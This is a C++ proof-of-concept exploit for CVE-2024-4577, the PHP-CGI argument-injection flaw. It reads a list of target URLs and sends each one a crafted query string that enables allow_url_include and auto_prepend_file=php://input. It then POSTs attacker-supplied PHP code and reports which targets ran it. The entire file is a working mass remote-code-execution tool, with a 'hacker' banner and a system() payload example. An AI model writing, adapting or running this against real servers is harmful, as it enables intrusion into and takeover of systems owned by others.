#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <curl/curl.h>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

int main(int argc, char* argv[]) {
    std::string banner = R"(
           ▄███████▄  ▄█     ▄█   ▄█▄    ▄████████  ▄████████    ▄█    █▄    ███    █▄  
          ███    ███ ███    ███ ▄███▀   ███    ███ ███    ███   ███    ███   ███    ███ 
          ███    ███ ███▌   ███▐██▀     ███    ███ ███    █▀    ███    ███   ███    ███ 
          ███    ███ ███▌  ▄█████▀      ███    ███ ███         ▄███▄▄▄▄███▄▄ ███    ███ 
        ▀█████████▀  ███▌ ▀▀█████▄    ▀███████████ ███        ▀▀███▀▀▀▀███▀  ███    ███ 
          ███        ███    ███▐██▄     ███    ███ ███    █▄    ███    ███   ███    ███ 
          ███        ███    ███ ▀███▄   ███    ███ ███    ███   ███    ███   ███    ███ 
         ▄████▀      █▀     ███   ▀█▀   ███    █▀  ████████▀    ███    █▀    ████████▀  

        CVE PoC (CVE-2024-4577) 
)";
    std::cout << banner << std::endl;
    std::cout << "(^_^) Prepare for tha big hacker skills pwn (^_^)" << std::endl; // Added missing semicolon here

    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " --target-list targets.txt -c \"<?php system('calc)?>\"" << std::endl;
        return 1;
    }

    std::string targetListFile = argv[2];
    std::string code = argv[3]; // Corrected index for command line argument

    std::ifstream file(targetListFile);
    if (!file) {
        std::cerr << "File " << targetListFile << " not found." << std::endl;
        return 1;
    }

    std::vector<std::string> targets;
    std::string line;
    while (std::getline(file, line)) {
        targets.push_back(line);
    }

    CURL *curl; // Corrected declaration
    CURLcode res; // Moved declaration inside the scope it's used
    std::string readBuffer;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        for (const auto& target : targets) {
            std::string url = target + "?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
            std::string postData = code + ";echo 1337; die;";

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                std::cerr << "Error targeting " << target << ": " << curl_easy_strerror(res) << std::endl;
            } else {
                if (readBuffer.find("1337") != std::string::npos) {
                    std::cout << "(+) Exploit was successful on " << target << std::endl;
                } else {
                    std::cout << "(!) Exploit failed on " << target << std::endl;
                }
            }

            readBuffer.clear();
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return 0;
}
